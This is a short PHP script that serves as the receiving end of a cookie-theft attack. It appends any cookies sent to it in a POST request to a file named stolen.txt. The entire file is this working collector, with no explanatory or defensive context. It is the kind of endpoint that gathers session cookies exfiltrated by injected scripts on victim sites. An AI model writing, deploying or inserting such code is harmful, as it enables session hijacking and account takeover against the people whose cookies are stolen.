<?php

if (isset($_POST['cookies']))
{
	$myfile = fopen("stolen.txt", "a") or die("Unable to open file!");
	$txt = $_POST['cookies'];
	fwrite($myfile, $txt . "\n");
	fclose($myfile);
}

?>
